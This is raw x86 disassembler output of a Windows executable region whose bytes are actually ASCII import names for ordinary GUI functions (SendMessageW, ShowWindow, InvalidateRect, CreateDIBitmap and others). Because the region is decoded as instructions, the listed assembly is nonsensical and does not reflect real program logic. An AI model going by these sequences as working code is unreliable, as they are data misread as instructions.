  428b0a:	add    dl,BYTE PTR [ebx+0x65]
  428b0d:	outs   dx,BYTE PTR ds:[esi]
  428b0e:	fs dec ebp
  428b10:	gs jae 0x428b86
  428b13:	popa   
  428b14:	addr16 gs push edi
  428b17:	add    BYTE PTR [eax],al
  428b19:	loop   0x428b1b
  428b1b:	inc    esi
  428b1c:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  428b23:	outs   dx,DWORD PTR ds:[esi]
  428b24:	ja     0x428b6b
  428b26:	js     0x428b69
  428b28:	add    BYTE PTR [eax],bl
  428b2a:	add    DWORD PTR [edi+0x65],eax
  428b2d:	je     0x428b78
  428b2f:	arpl   WORD PTR [edi+0x6e],bp
  428b32:	dec    ecx
  428b33:	outs   dx,BYTE PTR ds:[esi]
  428b34:	outs   dx,WORD PTR ds:[esi]
  428b36:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428b3d:	arpl   WORD PTR [eax+0x54],bp
  428b40:	outs   dx,DWORD PTR ds:[esi]
  428b41:	push   esp
  428b42:	push   0x69577369
  428b47:	outs   dx,BYTE PTR ds:[esi]
  428b48:	outs   dx,DWORD PTR fs:[esi]
  428b4a:	ja     0x428b4c
  428b4c:	add    BYTE PTR [ecx+0x616f4c01],ch
  428b52:	fs inc edx
  428b54:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb004170
  428b5c:	add    DWORD PTR [edi+0x65],eax
  428b5f:	je     0x428ba5
  428b61:	inc    ebx
  428b62:	inc    ebp
  428b63:	js     0x428b65
  428b65:	mov    al,ds:0x57734901
  428b6a:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428b71:	test   DWORD PTR [ecx],eax
  428b73:	dec    ecx
  428b74:	outs   dx,BYTE PTR ds:[esi]
  428b75:	jae    0x428bdc
  428b77:	jb     0x428bed
  428b79:	dec    ebp
  428b7a:	outs   dx,BYTE PTR gs:[esi]
  428b7c:	jne    0x428bc7
  428b7e:	je     0x428be5
  428b80:	ins    DWORD PTR es:[edi],dx
  428b81:	push   edi
  428b82:	add    BYTE PTR [esi+0x73795302],al
  428b88:	je     0x428bef
  428b8a:	ins    DWORD PTR es:[edi],dx
  428b8b:	push   eax
  428b8c:	popa   
  428b8d:	jb     0x428bf0
  428b8f:	ins    DWORD PTR es:[edi],dx
  428b90:	gs je  0x428bf8
  428b93:	jb     0x428c08
  428b95:	dec    ecx
  428b96:	outs   dx,BYTE PTR ds:[esi]
  428b97:	outs   dx,WORD PTR ds:[esi]
  428b99:	push   edi
  428b9a:	add    BYTE PTR [ebx+0x2],dh
  428b9d:	push   ebx
  428b9e:	gs je  0x428bf8
  428ba1:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428ba8:	js     0x428c1e
  428baa:	inc    ecx
  428bab:	add    BYTE PTR [eax],al
  428bad:	rol    BYTE PTR [ecx],1
  428baf:	dec    ebp
  428bb0:	gs jae 0x428c26
  428bb3:	popa   
  428bb4:	addr16 gs inc edx
  428bb7:	outs   dx,DWORD PTR ds:[esi]
  428bb8:	js     0x428bff
  428bba:	js     0x428c13
  428bbc:	add    BYTE PTR ds:0x74654701,dh
  428bc2:	dec    ebp
  428bc3:	outs   dx,BYTE PTR gs:[esi]
  428bc5:	jne    0x428c10
  428bc7:	je     0x428c2e
  428bc9:	ins    DWORD PTR es:[edi],dx
  428bca:	dec    ecx
  428bcb:	outs   dx,BYTE PTR ds:[esi]
  428bcc:	outs   dx,WORD PTR ds:[esi]
  428bce:	push   edi
  428bcf:	add    BYTE PTR [eax],al
  428bd1:	jge    0x428bd5
  428bd3:	push   ebx
  428bd4:	push   0x6353776f
  428bd9:	jb     0x428c4a
  428bdb:	ins    BYTE PTR es:[edi],dx
  428bdc:	ins    BYTE PTR es:[edi],dx
  428bdd:	inc    edx
  428bde:	popa   
  428bdf:	jb     0x428be1
  428be1:	cmp    al,0x0
  428be3:	inc    ebx
  428be4:	push   0x4d6b6365
  428be9:	outs   dx,BYTE PTR gs:[esi]
  428beb:	jne    0x428c3f
  428bed:	popa   
  428bee:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  428bf6:	add    BYTE PTR [edx+0x616f4c01],ch
  428bfc:	fs inc edx
  428bfe:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xab005770
  428c06:	add    BYTE PTR [edx+esi*2+0x61],al
  428c0a:	ja     0x428c4d
  428c0c:	outs   dx,BYTE PTR ds:[esi]
  428c0d:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  428c14:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  428c19:	mov    cl,0x2
  428c1b:	push   esi
  428c1c:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  428c20:	push   ebx
  428c21:	arpl   WORD PTR [ecx+0x6e],sp
  428c24:	push   edi
  428c25:	add    BYTE PTR [eax],al
  428c27:	add    DWORD PTR [ecx],0x65536e49
  428c2d:	outs   dx,BYTE PTR ds:[esi]
  428c2e:	fs dec ebp
  428c30:	gs jae 0x428ca6
  428c33:	popa   
  428c34:	addr16 gs inc ebp
  428c37:	js     0x428c39
  428c39:	ins    DWORD PTR es:[edi],dx
  428c3a:	add    DWORD PTR [edi+0x65],eax
  428c3d:	je     0x428c96
  428c3f:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  428c46:	outs   dx,BYTE PTR ds:[esi]
  428c47:	addr16 push edi
  428c49:	add    BYTE PTR [eax],al
  428c4b:	jle    0x428c4e
  428c4d:	dec    eax
  428c4e:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  428c56:	jne    0x428ca1
  428c58:	je     0x428cbf
  428c5a:	ins    DWORD PTR es:[edi],dx
  428c5b:	add    BYTE PTR [eax],al
  428c5d:	xor    DWORD PTR [eax],eax
  428c5f:	inc    ebx
  428c60:	push   0x72507261
  428c65:	gs jbe 0x428cbf
  428c68:	add    ah,ah
  428c6a:	add    BYTE PTR [esi+0x69],al
  428c6d:	outs   dx,BYTE PTR ds:[esi]
  428c6e:	fs push edi
  428c70:	imul   ebp,DWORD PTR [esi+0x64],0x57776f
  428c77:	sub    al,BYTE PTR [edx]
  428c79:	push   ebx
  428c7a:	outs   dx,BYTE PTR gs:[esi]
  428c7c:	fs dec ebp
  428c7e:	gs jae 0x428cf4
  428c81:	popa   
  428c82:	addr16 gs push esp
  428c85:	imul   ebp,DWORD PTR [ebp+0x65],0x5774756f
  428c8c:	add    BYTE PTR [ebx],al
  428c8e:	add    dl,BYTE PTR [edx+0x65]
  428c91:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428c99:	popa   
  428c9a:	jae    0x428d0f
  428c9c:	inc    ebp
  428c9d:	js     0x428ce0
  428c9f:	add    BYTE PTR [eax],al
  428ca1:	xchg   esi,eax
  428ca2:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428ca6:	outs   dx,BYTE PTR ds:[esi]
  428ca7:	jae    0x428d15
  428ca9:	popa   
  428caa:	je     0x428d11
  428cac:	dec    ebp
  428cad:	gs jae 0x428d23
  428cb0:	popa   
  428cb1:	add    BYTE PTR gs:[bx+si],al
  428cb5:	add    BYTE PTR [edx],0x53
  428cb8:	push   0x6957776f
  428cbd:	outs   dx,BYTE PTR ds:[esi]
  428cbe:	outs   dx,DWORD PTR fs:[esi]
  428cc0:	ja     0x428d03
  428cc2:	jae    0x428d3d
  428cc4:	outs   dx,BYTE PTR ds:[esi]
  428cc5:	arpl   WORD PTR [eax],ax
  428cc7:	mov    BYTE PTR [eax],0x45
  428cca:	outs   dx,BYTE PTR ds:[esi]
  428ccb:	fs push esp
  428ccd:	popa   
  428cce:	jae    0x428d3b
  428cd0:	add    bl,dh
  428cd2:	add    DWORD PTR [eax+0x6f],edx
  428cd5:	jae    0x428d4b
  428cd7:	push   ecx
  428cd8:	jne    0x428d43
  428cda:	je     0x428d29
  428cdc:	gs jae 0x428d52
  428cdf:	popa   
  428ce0:	add    BYTE PTR gs:[bp+si+0x1],bl
  428ce5:	inc    edi
  428ce6:	gs je  0x428d3c
  428ce9:	jns    0x428d5e
  428ceb:	inc    ebx
  428cec:	outs   dx,DWORD PTR ds:[esi]
  428ced:	ins    BYTE PTR es:[edi],dx
  428cee:	outs   dx,DWORD PTR ds:[esi]
  428cef:	jb     0x428d33
  428cf1:	jb     0x428d68
  428cf3:	jae    0x428d5d
  428cf5:	add    BYTE PTR [eax],al
  428cf7:	or     eax,DWORD PTR [eax]
  428cf9:	inc    ecx
  428cfa:	je     0x428d70
  428cfc:	popa   
  428cfd:	arpl   WORD PTR [eax+0x54],bp
  428d00:	push   0x64616572
  428d05:	dec    ecx
  428d06:	outs   dx,BYTE PTR ds:[esi]
  428d07:	jo     0x428d7e
  428d09:	je     0x428d0b
  428d0b:	adc    BYTE PTR [ecx],al
  428d0d:	inc    edi
  428d0e:	gs je  0x428d55
  428d11:	ins    BYTE PTR es:[edi],dx
  428d12:	addr16 dec ecx
  428d14:	je     0x428d7b
  428d16:	ins    DWORD PTR es:[edi],dx
  428d17:	dec    ecx
  428d18:	outs   dx,BYTE PTR ds:[esi]
  428d19:	je     0x428d1b
  428d1b:	mov    eax,0x61724400
  428d20:	ja     0x428d75
  428d22:	je     0x428d85
  428d24:	je     0x428d8b
  428d26:	push   edi
  428d27:	add    BYTE PTR [eax],al
  428d29:	adc    eax,DWORD PTR [edx]
  428d2b:	push   edx
  428d2c:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  428d35:	outs   dx,BYTE PTR ds:[esi]
  428d36:	outs   dx,DWORD PTR fs:[esi]
  428d38:	ja     0x428d87
  428d3a:	gs jae 0x428db0
  428d3d:	popa   
  428d3e:	addr16 gs push edi
  428d41:	add    BYTE PTR [eax],al
  428d43:	or     al,BYTE PTR [eax]
  428d45:	inc    ecx
  428d46:	jb     0x428dba
  428d48:	popa   
  428d49:	outs   dx,BYTE PTR ds:[esi]
  428d4a:	addr16 gs dec ecx
  428d4d:	arpl   WORD PTR [edi+0x6e],bp
  428d50:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  428d57:	ja     0x428dcc
  428d59:	add    BYTE PTR [eax],al
  428d5b:	jnp    0x428d5f
  428d5d:	push   ebx
  428d5e:	push   0x7543776f
  428d63:	jb     0x428dd8
  428d65:	outs   dx,DWORD PTR ds:[esi]
  428d66:	jb     0x428d68
  428d68:	add    BYTE PTR [eax],ch
  428d6a:	add    BYTE PTR [ebx+0x68],al
  428d6d:	popa   
  428d6e:	jb     0x428dbc
  428d70:	outs   dx,DWORD PTR ds:[esi]
  428d71:	ja     0x428dd8
  428d73:	jb     0x428db7
  428d75:	jne    0x428ddd
  428d77:	push   di
  428d79:	add    BYTE PTR [eax],al
  428d7b:	mov    esi,0x756f6d02
  428d80:	jae    0x428de7
  428d82:	pop    edi
  428d83:	gs jbe 0x428deb
  428d86:	outs   dx,BYTE PTR ds:[esi]
  428d87:	je     0x428d89
  428d89:	mov    bl,0x0
  428d8b:	inc    esp
  428d8c:	jb     0x428def
  428d8e:	ja     0x428dd9
  428d90:	arpl   WORD PTR [edi+0x6e],bp
  428d93:	add    BYTE PTR [eax],al
  428d95:	adc    al,BYTE PTR [edx]
  428d97:	push   edx
  428d98:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  428da1:	outs   dx,BYTE PTR ds:[esi]
  428da2:	outs   dx,DWORD PTR fs:[esi]
  428da4:	ja     0x428df3
  428da6:	gs jae 0x428e1c
  428da9:	popa   
  428daa:	addr16 gs inc ecx
  428dad:	add    BYTE PTR [eax],al
  428daf:	daa    
  428db0:	add    DWORD PTR [edi+0x65],eax
  428db3:	je     0x428e00
  428db5:	gs jns 0x428e1a
  428db8:	outs   dx,DWORD PTR ds:[esi]
  428db9:	popa   
  428dba:	jb     0x428e20
  428dbc:	push   esp
  428dbd:	jns    0x428e2f
  428dbf:	add    BYTE PTR gs:[edi+0x66654400],cl
  428dc6:	push   edi
  428dc7:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428dce:	outs   dx,DWORD PTR ds:[esi]
  428dcf:	arpl   WORD PTR [edi+0x0],dx
  428dd2:	add    BYTE PTR [eax+0x536e4901],al
  428dd8:	outs   dx,BYTE PTR gs:[esi]
  428dda:	fs dec ebp
  428ddc:	gs jae 0x428e52
  428ddf:	popa   
  428de0:	add    BYTE PTR gs:[bp+di],dh
  428de4:	add    DWORD PTR [edi+0x65],eax
  428de7:	je     0x428e36
  428de9:	outs   dx,BYTE PTR gs:[esi]
  428deb:	jne    0x428e36
  428ded:	je     0x428e54
  428def:	ins    DWORD PTR es:[edi],dx
  428df0:	dec    ecx
  428df1:	inc    esp
  428df2:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  428df9:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x73490190
  428e01:	inc    ebx
  428e02:	push   0x6f4c7261
  428e07:	ja     0x428e6e
  428e09:	jb     0x428e4c
  428e0b:	add    BYTE PTR [eax],al
  428e0d:	jmp    0x74a7d512
  428e12:	inc    ecx
  428e13:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428e17:	gs push edi
  428e19:	imul   ebp,DWORD PTR [esi+0x64],0x3a00776f
  428e20:	add    dl,BYTE PTR [ebx+0x65]
  428e23:	je     0x428e68
  428e25:	jne    0x428e99
  428e27:	jae    0x428e98
  428e29:	jb     0x428e7b
  428e2b:	outs   dx,DWORD PTR ds:[esi]
  428e2c:	jae    0x428e2e
  428e2e:	add    BYTE PTR ds:0x74654701,dl
  428e34:	inc    esi
  428e35:	outs   dx,DWORD PTR ds:[esi]
  428e36:	jb     0x428e9d
  428e38:	addr16 jb 0x428eaa
  428e3b:	jne    0x428eab
  428e3d:	fs push edi
  428e3f:	imul   ebp,DWORD PTR [esi+0x64],0x2300776f
  428e46:	add    DWORD PTR [edi+0x65],eax
  428e49:	je     0x428e96
  428e4b:	gs jns 0x428eb0
  428e4e:	outs   dx,DWORD PTR ds:[esi]
  428e4f:	popa   
  428e50:	jb     0x428eb6
  428e52:	dec    esp
  428e53:	popa   
  428e54:	jns    0x428ec5
  428e56:	jne    0x428ecc
  428e58:	dec    esp
  428e59:	imul   esi,DWORD PTR [ebx+0x74],0x43006300
  428e60:	jb     0x428ec7
  428e62:	popa   
  428e63:	je     0x428eca
  428e65:	push   edi
  428e66:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428e6d:	push   edi
  428e6e:	add    BYTE PTR [edx+0x766e4901],cl
  428e74:	popa   
  428e75:	ins    BYTE PTR es:[edi],dx
  428e76:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  428e7e:	add    BYTE PTR [eax],bh
  428e80:	add    BYTE PTR [ebx+0x68],al
  428e83:	popa   
  428e84:	jb     0x428edb
  428e86:	jo     0x428ef8
  428e88:	gs jb  0x428ecd
  428e8b:	jne    0x428ef3
  428e8d:	push   di
  428e8f:	add    BYTE PTR [eax],al
  428e91:	mov    al,BYTE PTR [edx]
  428e93:	push   esp
  428e94:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  428e9c:	ja     0x428f11
  428e9e:	add    dh,dh
  428ea0:	add    BYTE PTR [edi+0x65],al
  428ea3:	je     0x428ee8
  428ea5:	ins    BYTE PTR es:[edi],dx
  428ea6:	popa   
  428ea7:	jae    0x428f1c
  428ea9:	dec    ecx
  428eaa:	outs   dx,BYTE PTR ds:[esi]
  428eab:	outs   dx,WORD PTR ds:[esi]
  428ead:	inc    ebp
  428eae:	js     0x428f07
  428eb0:	add    BYTE PTR [esi+0x736e4901],al
  428eb6:	gs jb  0x428f2d
  428eb9:	dec    ebp
  428eba:	outs   dx,BYTE PTR gs:[esi]
  428ebc:	jne    0x428f15
  428ebe:	add    BYTE PTR [eax],bh
  428ec0:	add    DWORD PTR [edi+0x65],eax
  428ec3:	je     0x428f12
  428ec5:	outs   dx,BYTE PTR gs:[esi]
  428ec7:	jne    0x428f1c
  428ec9:	je     0x428f3d
  428ecb:	imul   ebp,DWORD PTR [esi+0x67],0x11000041
  428ed2:	add    DWORD PTR [edi+0x65],eax
  428ed5:	je     0x428f1b
  428ed7:	ins    BYTE PTR es:[edi],dx
  428ed8:	addr16 dec ecx
  428eda:	je     0x428f41
  428edc:	ins    DWORD PTR es:[edi],dx
  428edd:	push   esp
  428ede:	gs js  0x428f55
  428ee1:	inc    ecx
  428ee2:	add    BYTE PTR [eax+0x44734901],bl
  428ee8:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  428eef:	jae    0x428f64
  428ef1:	popa   
  428ef2:	addr16 gs push edi
  428ef5:	add    BYTE PTR [eax],al
  428ef7:	mov    al,ds:0x73694400
  428efc:	jo     0x428f5f
  428efe:	je     0x428f63
  428f00:	push   0x7373654d
  428f05:	popa   
  428f06:	addr16 gs push edi
  428f09:	add    BYTE PTR [eax],al
  428f0b:	js     0x428f0e
  428f0d:	inc    edi
  428f0e:	gs je  0x428f68
  428f11:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428f18:	js     0x428f8e
  428f1a:	push   edi
  428f1b:	add    BYTE PTR [eax],al
  428f1d:	sub    eax,0x6e655302
  428f22:	fs dec esi
  428f24:	outs   dx,DWORD PTR ds:[esi]
  428f25:	je     0x428f90
  428f27:	data16 jns 0x428f77
  428f2a:	gs jae 0x428fa0
  428f2d:	popa   
  428f2e:	addr16 gs push edi
  428f31:	add    BYTE PTR [eax],al
  428f33:	and    BYTE PTR [edx],al
  428f35:	push   ebx
  428f36:	arpl   WORD PTR [edx+0x6f],si
  428f39:	ins    BYTE PTR es:[edi],dx
  428f3a:	ins    BYTE PTR es:[edi],dx
  428f3b:	push   edi
  428f3c:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428f43:	add    BYTE PTR [eax],al
  428f45:	add    WORD PTR [edi+0x65],ax
  428f49:	je     0x428fa0
  428f4b:	jae    0x428fb2
  428f4d:	jb     0x428f9e
  428f4f:	bound  ebp,QWORD PTR [edx+0x65]
  428f52:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428f56:	outs   dx,WORD PTR ds:[esi]
  428f58:	jb     0x428fc7
  428f5a:	popa   
  428f5b:	je     0x428fc6
  428f5d:	outs   dx,DWORD PTR ds:[esi]
  428f5e:	outs   dx,BYTE PTR ds:[esi]
  428f5f:	push   edi
  428f60:	add    ch,dh
  428f62:	add    DWORD PTR [eax+0x6f],edx
  428f65:	jae    0x428fdb
  428f67:	push   esp
  428f68:	push   0x64616572
  428f6d:	dec    ebp
  428f6e:	gs jae 0x428fe4
  428f71:	popa   
  428f72:	addr16 gs push edi
  428f75:	add    BYTE PTR [eax],al
  428f77:	mov    eax,DWORD PTR [ecx]
  428f79:	dec    ecx
  428f7a:	outs   dx,BYTE PTR ds:[esi]
  428f7b:	jbe    0x428fe2
  428f7d:	jb     0x428ff3
  428f7f:	push   edx
  428f80:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428f85:	xchg   edi,eax
  428f86:	add    DWORD PTR [ecx+0x73],ecx
  428f89:	inc    esp
  428f8a:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  428f91:	jae    0x429006
  428f93:	popa   
  428f94:	addr16 gs inc ecx
  428f97:	add    BYTE PTR [eax],al
  428f99:	mov    ch,0x0
  428f9b:	inc    esp
  428f9c:	jb     0x428fff
  428f9e:	ja     0x428fed
  428fa0:	outs   dx,BYTE PTR gs:[esi]
  428fa2:	jne    0x428fe6
  428fa4:	popa   
  428fa5:	jb     0x428fa7
  428fa7:	push   ebp
  428fa8:	push   ebx
  428fa9:	inc    ebp
  428faa:	push   edx
  428fab:	xor    esi,DWORD PTR [edx]
  428fad:	cs fs ins BYTE PTR es:[edi],dx
  428fb0:	ins    BYTE PTR es:[edi],dx
  428fb1:	add    BYTE PTR [eax],al
  428fb3:	int3   
  428fb4:	add    DWORD PTR [ebx+0x65],edx
  428fb7:	ins    BYTE PTR es:[edi],dx
  428fb8:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428fbd:	imul   esi,DWORD PTR [eax+0x52],0x88006e67
  428fc4:	add    BYTE PTR [ebx+0x72],al
  428fc7:	gs popa 
  428fc9:	je     0x429030
  428fcb:	inc    edx
  428fcc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428fd4:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428fdb:	rol    BYTE PTR [eax],0x45
  428fde:	outs   dx,BYTE PTR ds:[esi]
  428fdf:	fs push eax
  428fe1:	popa   
  428fe2:	je     0x42904c
  428fe4:	add    dh,cl
  428fe6:	add    DWORD PTR [ebx+0x65],edx
  428fe9:	ins    BYTE PTR es:[edi],dx
  428fea:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428fef:	push   0x65
  428ff1:	arpl   WORD PTR [eax+eax*1+0x0],si
  428ff5:	fiadd  WORD PTR [ecx]
  428ff7:	push   ebx
  428ff8:	gs je  0x42903f
  428ffb:	dec    ecx
  428ffc:	inc    edx
  428ffd:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  429005:	imul   esp,DWORD PTR [ebx+0x65],0x43009e00
  42900c:	jb     0x429073
  42900e:	popa   
  42900f:	je     0x429076
  429011:	inc    esi
  429012:	outs   dx,DWORD PTR ds:[esi]
  429013:	outs   dx,BYTE PTR ds:[esi]
  429014:	je     0x42906d
  429016:	add    dh,dh
  429018:	add    DWORD PTR [ebx+0x65],edx
  42901b:	je     0x429070
  42901d:	je     0x429091
  42901f:	gs je  0x429085
  429022:	push   0x4d746c42
  429027:	outs   dx,DWORD PTR ds:[esi]
  429028:	fs add BYTE PTR gs:[eax+0x65724300],dh
  429030:	popa   
  429031:	je     0x429098
  429033:	push   ebx
  429034:	outs   dx,DWORD PTR ds:[esi]
  429035:	ins    BYTE PTR es:[edi],dx
  429036:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  42903e:	add    bh,cl
  429040:	add    DWORD PTR [ebx+0x65],edx
  429043:	ins    BYTE PTR es:[edi],dx
  429044:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  429049:	ins    BYTE PTR es:[edi],dx
  42904a:	gs je  0x4290c1
  42904d:	add    BYTE PTR gs:[edx+0x63655201],bh
  429054:	je     0x4290ac
  429056:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  42905d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42905e:	add    DWORD PTR [eax+0x61],edx
  429061:	je     0x4290a5
  429063:	ins    BYTE PTR es:[edi],dx
  429064:	je     0x429066
  429066:	add    BYTE PTR [ebx+0x65724300],dl
  42906c:	popa   
  42906d:	je     0x4290d4
  42906f:	inc    esp
  429070:	dec    ecx
  429071:	inc    edx
  429072:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xdc000070
  42907a:	add    DWORD PTR [ebx+0x65],edx
  42907d:	je     0x4290c3
  42907f:	dec    ecx
  429080:	inc    edx
  429081:	inc    ebx
  429082:	outs   dx,DWORD PTR ds:[esi]
  429083:	ins    BYTE PTR es:[edi],dx
  429084:	outs   dx,DWORD PTR ds:[esi]
  429085:	jb     0x4290db
  429087:	popa   
  429088:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  42908c:	add    BYTE PTR [eax+0x1],al
  42908f:	inc    edi
  429090:	gs je  0x4290d7
  429093:	dec    ecx
  429094:	inc    edx
  429095:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655201c1
  42909d:	ins    DWORD PTR es:[edi],dx
  42909e:	outs   dx,DWORD PTR ds:[esi]
  42909f:	jbe    0x429106
  4290a1:	inc    esi
  4290a2:	outs   dx,DWORD PTR ds:[esi]
  4290a3:	outs   dx,BYTE PTR ds:[esi]
  4290a4:	je     0x4290f8
  4290a6:	gs jae 0x429118
  4290a9:	jne    0x42911d
  4290ab:	arpl   WORD PTR [ebp+0x57],sp
  4290ae:	add    ah,bh
  4290b0:	add    DWORD PTR [ebx+0x65],edx
  4290b3:	je     0x42910b
  4290b5:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4290bc:	inc    ebp
  4290bd:	js     0x429133
  4290bf:	inc    ebp
  4290c0:	js     0x4290c2
  4290c2:	add    BYTE PTR [esi],dh
  4290c4:	add    DWORD PTR [edi+0x65],eax
  4290c7:	je     0x42910c
  4290c9:	ins    BYTE PTR es:[edi],dx
  4290ca:	imul   esi,DWORD PTR [eax+0x42],0x786f
  4290d1:	cmp    al,BYTE PTR [ecx]
  4290d3:	inc    edi
  4290d4:	gs je  0x42911a
  4290d7:	jne    0x42914b
  4290d9:	jb     0x429140
  4290db:	outs   dx,BYTE PTR ds:[esi]
  4290dc:	je     0x42912d
  4290de:	bound  ebp,QWORD PTR [edx+0x65]
  4290e1:	arpl   WORD PTR [eax+eax*1+0x0],si
  4290e5:	xchg   edx,eax
  4290e6:	add    BYTE PTR [ebx+0x72],al
  4290e9:	gs popa 
  4290eb:	je     0x429152
  4290ed:	inc    esp
  4290ee:	dec    ecx
  4290ef:	inc    edx
  4290f0:	push   ebx
  4290f1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4290f6:	outs   dx,BYTE PTR ds:[esi]
  4290f7:	add    BYTE PTR [eax],al
  4290f9:	out    0x1,al
  4290fb:	push   ebx
  4290fc:	gs je  0x42914b
  4290ff:	popa   
  429100:	jns    0x429171
  429102:	jne    0x429178
  429104:	add    BYTE PTR ds:0x61745302,al
  42910a:	jb     0x429180
  42910c:	push   eax
  42910d:	popa   
  42910e:	add    BYTE PTR gs:[bx+di+0x4f01],ah
  429114:	data16 data16 jae 0x42917d
  429118:	je     0x429170
  42911a:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  429121:	dec    edi
  429122:	jb     0x42918b
  429124:	inc    ebp
  429125:	js     0x429127
  429127:	add    DWORD PTR [bx+0x65],eax
  42912b:	je     0x42917c
  42912d:	bound  ebp,QWORD PTR [edx+0x65]
  429130:	arpl   WORD PTR [ecx+eax*2+0x0],si
  429134:	add    BYTE PTR [edx+eax*1],dl
  429137:	push   edi
  429138:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  429140:	add    BYTE PTR [ecx],al
  429142:	add    dl,BYTE PTR [ebx+0x65]
  429145:	je     0x42919e
  429147:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  42914e:	addr16 inc ebp
  429150:	js     0x429152
  429152:	add    BYTE PTR [edx+0x65724300],bl
  429158:	popa   
  429159:	je     0x4291c0
  42915b:	inc    esi
  42915c:	outs   dx,DWORD PTR ds:[esi]
  42915d:	outs   dx,BYTE PTR ds:[esi]
  42915e:	je     0x4291a9
  429160:	outs   dx,BYTE PTR ds:[esi]
  429161:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  429169:	mov    DWORD PTR [eax],0x6d756e45
  42916f:	inc    esi
  429170:	outs   dx,DWORD PTR ds:[esi]
  429171:	outs   dx,BYTE PTR ds:[esi]
  429172:	je     0x4291e7
  429174:	push   edi
  429175:	add    BYTE PTR [eax],al
  429177:	pop    es
  429178:	add    BYTE PTR [ecx+0x64],al
  42917b:	fs inc esi
  42917d:	outs   dx,DWORD PTR ds:[esi]
  42917e:	outs   dx,BYTE PTR ds:[esi]
  42917f:	je     0x4291d3
  429181:	gs jae 0x4291f3
  429184:	jne    0x4291f8
  429186:	arpl   WORD PTR [ebp+0x57],sp
  429189:	add    BYTE PTR [eax],al
  42918b:	xlat   BYTE PTR ds:[ebx]
  42918c:	add    DWORD PTR [ebx+0x65],edx
  42918f:	je     0x4291d3
  429191:	jb     0x429208
  429193:	jae    0x4291fd
  429195:	dec    edi
  429196:	jb     0x4291ff
  429198:	inc    ebp
  429199:	js     0x42919b
  42919b:	mov    ecx,0x63655201
  4291a0:	je     0x4291eb
  4291a2:	outs   dx,BYTE PTR ds:[esi]
  4291a3:	push   edx
  4291a4:	imul   ebp,DWORD PTR gs:[bx+0x6e],0x1e80000
  4291ad:	push   ebx
  4291ae:	gs je  0x4291fe
  4291b1:	popa   
  4291b2:	jo     0x429201
  4291b4:	outs   dx,DWORD PTR ds:[esi]
  4291b5:	fs add BYTE PTR gs:[eax],al
  4291b9:	mov    cl,0x0
  4291bb:	inc    esp
  4291bc:	push   eax
  4291bd:	je     0x42922e
  4291bf:	dec    esp
  4291c0:	push   eax
  4291c1:	add    BYTE PTR [eax],al
  4291c3:	mov    esi,0x646e4500
  4291c8:	inc    esp
  4291c9:	outs   dx,DWORD PTR ds:[esi]
  4291ca:	arpl   WORD PTR [eax],ax
  4291cc:	add    BYTE PTR [edx+0x65724300],ah
  4291d2:	popa   
  4291d3:	je     0x42923a
  4291d5:	dec    ecx
  4291d6:	inc    ebx
  4291d7:	push   edi
  4291d8:	add    BYTE PTR [ebp+0x0],dh
  4291db:	inc    edx
  4291dc:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4291e5:	xchg   ecx,eax
  4291e6:	add    DWORD PTR [edi+0x65],eax
  4291e9:	je     0x429242
  4291eb:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4291f2:	addr16 inc ebp
  4291f4:	js     0x4291f6
  4291f6:	add    BYTE PTR [esi+0x65724300],ah
  4291fc:	popa   
  4291fd:	je     0x429264
  4291ff:	push   eax
  429200:	popa   
  429201:	je     0x429277
  429203:	gs jb  0x429274
  429206:	inc    edx
  429207:	jb     0x42927e
  429209:	jae    0x429273
  42920b:	add    BYTE PTR [eax],al
  42920d:	xchg   esp,eax
  42920e:	add    BYTE PTR [ebx+0x72],al
  429211:	gs popa 
  429213:	je     0x42927a
  429215:	inc    esp
  429216:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
